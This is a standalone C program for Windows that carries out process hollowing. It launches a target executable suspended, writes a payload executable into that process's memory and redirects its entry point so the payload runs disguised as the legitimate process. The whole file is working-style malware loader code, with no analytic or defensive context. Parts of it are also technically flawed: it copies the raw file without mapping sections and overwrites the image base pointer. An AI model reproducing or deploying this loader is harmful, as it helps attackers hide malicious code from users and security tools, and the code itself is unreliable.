#include <windows.h>
#include <tlhelp32.h>
#include <stdio.h>

int main(int argc, char* argv[]) {
    if (argc != 3) {
        printf("Usage: %s <path_to_target_exe> <path_to_hollowing_payload_exe>\n", argv[0]);
        return 1;
    }

    const char* targetExe = argv[1];
    const char* hollowingPayload = argv[2];

    STARTUPINFO si = { sizeof(si) };
    PROCESS_INFORMATION pi;

    if (!CreateProcess(targetExe, NULL, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi)) {
        printf("Failed to create target process.\n");
        return 1;
    }

    CONTEXT ctx;
    ctx.ContextFlags = CONTEXT_FULL;

    if (!GetThreadContext(pi.hThread, &ctx)) {
        printf("Failed to get thread context.\n");
        return 1;
    }

    DWORD baseAddress = 0;
    ReadProcessMemory(pi.hProcess, (LPCVOID)(ctx.Ebx + 8), &baseAddress, sizeof(baseAddress), NULL);

    HANDLE hFile = CreateFile(hollowingPayload, GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    DWORD fileSize = GetFileSize(hFile, NULL);
    LPVOID buffer = VirtualAlloc(NULL, fileSize, MEM_COMMIT, PAGE_READWRITE);
    ReadFile(hFile, buffer, fileSize, NULL, NULL);

    PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)buffer;
    PIMAGE_NT_HEADERS ntHeaders = (PIMAGE_NT_HEADERS)((DWORD)buffer + dosHeader->e_lfanew);

    WriteProcessMemory(pi.hProcess, (LPVOID)baseAddress, buffer, ntHeaders->OptionalHeader.SizeOfImage, NULL);
    WriteProcessMemory(pi.hProcess, (LPVOID)(ctx.Ebx + 8), &ntHeaders->OptionalHeader.AddressOfEntryPoint, sizeof(DWORD), NULL);

    ctx.Eax = baseAddress + ntHeaders->OptionalHeader.AddressOfEntryPoint;
    SetThreadContext(pi.hThread, &ctx);
    ResumeThread(pi.hThread);

    CloseHandle(hFile);
    VirtualFree(buffer, 0, MEM_RELEASE);

    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);

    printf("Process hollowing executed successfully.\n");
    return 0;
}
